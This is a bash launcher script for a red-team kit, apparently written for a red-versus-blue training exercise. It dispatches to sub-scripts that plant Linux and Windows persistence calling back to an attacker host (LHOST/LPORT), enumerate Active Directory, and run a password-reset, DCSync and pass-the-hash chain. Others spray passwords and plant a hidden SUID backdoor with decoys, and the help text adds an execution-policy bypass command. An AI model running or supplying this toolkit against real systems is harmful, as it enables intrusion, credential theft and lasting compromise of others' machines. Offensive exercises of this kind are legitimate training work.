#!/usr/bin/env bash
# red.sh — one entry point for the red kit. No arguments prints this.
#
#   bash red.sh plant  <KALI_IP> 4444 [user] [pubkey]    # 5 persistence mechanisms on Ubuntu
#   bash red.sh recon  <DC_IP> <user> <pass> [domain] [CA]  # AD enumeration, saves to ./loot
#   bash red.sh chain  <DC_IP> <domain> <user> <pass> <victim>   # reset -> dcsync -> hash
#   bash red.sh win                                        # reminder for the Windows one-liner
#
# Windows is a separate file because it runs inside evil-winrm, not on Kali:
#   .\red\plant_windows.ps1 -LHOST <KALI_IP> -LPORT 4444

set -u
DIR="$(cd "$(dirname "$0")" && pwd)"
cmd="${1:-help}"
[ $# -gt 0 ] && shift

case "$cmd" in
  plant)
    exec bash "$DIR/red/plant_linux.sh" "$@"
    ;;
  recon|recon-ad|loot)
    exec bash "$DIR/red/loot_ad.sh" "$@"
    ;;
  chain|ad)
    exec bash "$DIR/red/ad_chain.sh" "$@"
    ;;
  privesc|suid|survey)
    exec bash "$DIR/red/linux_privesc.sh" "$@"
    ;;
  backdoor|decoys|plant-suid)
    exec bash "$DIR/red/backdoor_suid.sh" "$@"
    ;;
  discover|find)
    exec bash "$DIR/discover.sh" "$@"
    ;;
  spray)
    exec bash "$DIR/spray.sh" "$@"
    ;;
  evidence|shot)
    exec bash "$DIR/evidence.sh" "$@"
    ;;
  win|windows)
    cat <<'EOF'
Windows persistence runs inside your evil-winrm session, not on Kali:

  Set-ExecutionPolicy Bypass -Scope Process -Force
  .\red\plant_windows.ps1 -LHOST <KALI_IP> -LPORT 4444

That plants a scheduled task, a Run key, a local admin and a WMI subscription,
and prints a summary table to screenshot.
EOF
    ;;
  help|*)
    cat <<'EOF'
red.sh — red kit entry point

  bash red.sh plant  <KALI_IP> <LPORT> [user] [pubkey]
        five persistence mechanisms on Ubuntu: crontab, systemd user timer,
        .bashrc, authorized_keys, new sudo user

  bash red.sh recon  <DC_IP> <user> <pass> [domain] [CA_IP]
        AD enumeration: host facts, users, groups, kerberoast, asreproast,
        writable objects, ADCS templates. Writes ./loot/

  bash red.sh chain  <DC_IP> <domain> <user> <pass> <victim>
        reset a password, grant replication rights, dump the Administrator
        hash, then prints the pass-the-hash command

  bash red.sh privesc            rank local Linux escalation paths (read only)
  bash red.sh privesc --auto     rank them AND prove each one, no shells opened,
                                 nothing written. Prints [ROOT] for every vector
                                 that actually returns root.
        checks: sudo and sudo drop-ins, SUID versus the stock Debian set,
        capabilities, cron, writable units, PATH, docker/lxd, world-writable
        dirs, FTP upload dir, kernel CVE range

        Tomorrow's order: run --auto first to learn which vector is live on a box
        you have never seen, then hand-run two of the winners for the screenshot.
        The report needs your narration of what the output meant.

  bash red.sh backdoor         plant YOUR OWN SUID vector plus four decoys
  bash red.sh backdoor --remove   take it all back out, via a manifest
        the red packet asks for both: "configure privilege escalation vectors"
        and "wasting blue's time counts if you explain it". Blue patches the
        shipped SUID binaries, so yours has to be the one they miss.

  bash red.sh win
        the reminder for the Windows script (runs inside evil-winrm)

Everything writes a summary at the end. Screenshot those, they are your evidence.
EOF
    ;;
esac
